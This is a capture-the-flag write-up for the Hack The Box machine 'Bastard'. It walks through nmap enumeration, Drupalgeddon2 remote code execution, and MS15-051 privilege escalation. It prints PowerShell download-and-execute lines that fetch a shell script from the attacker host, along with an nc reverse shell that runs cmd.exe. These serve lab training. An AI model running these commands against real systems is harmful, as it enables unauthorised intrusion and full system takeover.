# Bastard
## Information Gathering
10.10.10.9
Bastard

#### Ports
80
135
49154

#### Passive Recon
- PHP/5.3.28
- Microsoft-IIS/7.5
- X-Powered-By: ASP.NET
- Drupal 7.54


#### On the fly 
- Drupal CMS. Ton of exploits for this

## Enumeration
Start with your nmap scan:
```bash
# Nmap 7.92 scan initiated Sun May 15 10:58:18 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/kali/Documents/Repositories/CTF/LearningPlatforms/hackthebox/machines/medium/bastard/results/10.10.10.9
/scans/_quick_tcp_nmap.txt -oX /home/kali/Documents/Repositories/CTF/LearningPlatforms/hackthebox/machines/medium/bastard/results/10.10.10.9/scans/xml/_quick_tcp_nmap.xml 10.10.10.9
Nmap scan report for 10.10.10.9
Host is up, received user-set (0.057s latency).
Scanned at 2022-05-15 10:58:19 EDT for 82s
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE REASON          VERSION
80/tcp    open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
```


## Exploitation
Navigating to the webpage shows that it's Drupal 7 CMS. You can navigate to http://10.10.10.9/CHANGELOG.txt which shows that this is Drupal 7.54

Using searchsploit shows that there's a ton of RCE epxloits for Drupal 7. I used [this](https://www.exploit-db.com/exploits/44449) exploit to gain RCE.
```bash
$ ruby drupalgeddon2.py 10.10.10.9
```

Which gives me a wacky partial shell. I staged a three stage persistance exploit
1. Start a python web server `python3 -m http.server 80` while hosting Invoke-PowerShellTcp.ps1
2. Start a reverse shell `nc -lnvp 53`
3. Get and execute the file with powershell `powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10/shell.ps1')`

And i catch a reverse shell and get the user flag.

## Privilege Escalation
[This](https://github.com/51x/WHP) repository has a lot of good information for manually trying to escalate privileges in Windows. I went with [MS15-051](https://www.exploit-db.com/exploits/37049).

Run this exploit:
```powershell
\\10.10.14.10\pwn\ms15-051x64.exe "whoami"
nt authority\system
```

I started another reverse shell `nc -lnvp 53` and ran the same commands as I did to get foothold
```powershell
\\10.10.14.10\pwn\ms15-051x64.exe "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10/shell.ps1')"
```

Drops me into a "nt authority/system" shell to get the root flag.

You could've done the same with nc
```powershell
\\10.10.14.10\pwn\ms15-051x64.exe "nc.exe -nv 10.10.14.10 1337 -e cmd.exe"
```